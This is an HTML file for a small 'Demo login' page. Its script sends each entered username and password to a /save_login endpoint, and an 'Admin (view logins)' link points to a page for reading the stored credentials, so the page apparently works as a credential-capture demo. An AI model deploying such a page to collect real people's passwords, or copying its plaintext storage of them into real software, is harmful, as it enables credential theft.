<!-- index.html -->
<!doctype html>
<html lang="uk">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Login demo</title>
  <style>
    body{font-family:Arial, sans-serif;max-width:520px;margin:40px auto;padding:12px}
    input{display:block;margin:8px 0;padding:8px;width:100%;box-sizing:border-box}
    button{padding:10px 14px}
    .msg{margin-top:12px;color:green}
  </style>
</head>
<body>
  <h2>Demo login</h2>
  <form id="loginForm">
    <input name="username" id="username" placeholder="Username" required>
    <input name="password" id="password" type="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <div class="msg" id="status"></div>

  <p><a href="/admin" target="_blank">Admin (view logins)</a></p>

  <script>
    const form = document.getElementById('loginForm');
    const status = document.getElementById('status');
    form.addEventListener('submit', e => {
      e.preventDefault();
      const u = document.getElementById('username').value;
      const p = document.getElementById('password').value;
      fetch('/save_login', {
        method: 'POST',
        headers: {'Content-Type':'application/x-www-form-urlencoded'},
        body: 'username=' + encodeURIComponent(u) + '&password=' + encodeURIComponent(p)
      }).then(r => r.text()).then(t => {
        status.textContent = t;
        form.reset();
      }).catch(err => {
        status.textContent = 'Error';
        console.error(err);
      });
    });
  </script>
</body>
</html>
